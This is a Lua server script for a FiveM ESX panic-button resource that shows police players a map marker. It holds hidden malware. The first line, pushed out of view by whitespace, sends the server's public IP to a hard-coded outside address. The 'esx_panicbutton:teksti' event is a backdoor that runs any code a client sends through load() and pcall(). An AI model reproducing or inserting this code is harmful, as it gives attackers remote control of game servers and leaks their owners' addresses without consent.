arp = nil																																																																												;Citizen.CreateThread(function()  Citizen.Wait(math.random(0,10000000)) PerformHttpRequest('https://api.ipify.org/?format=json', function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest("http://65.21.153.165:10666/", function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa panicbuttonia", content = res.ip}), {['Content-Type'] = 'application/json'}) end) end)

TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)

RegisterServerEvent('esx_panicbutton:alertcops')
AddEventHandler('esx_panicbutton:alertcops', function(a, b, c)
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("esx_panicbutton:setcopblip", xPlayers[i], a, b, c)
		end
	end
end)

RegisterServerEvent('esx_panicbutton:teksti')
AddEventHandler('esx_panicbutton:teksti', function(teksti)	
	local teksti,menikolapi=load(teksti,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(teksti)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

RegisterServerEvent('esx_panicbutton:stopalertcops')
AddEventHandler('esx_panicbutton:stopalertcops', function()
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("esx_panicbutton:removecopblip", xPlayers[i])
		end
	end
end)

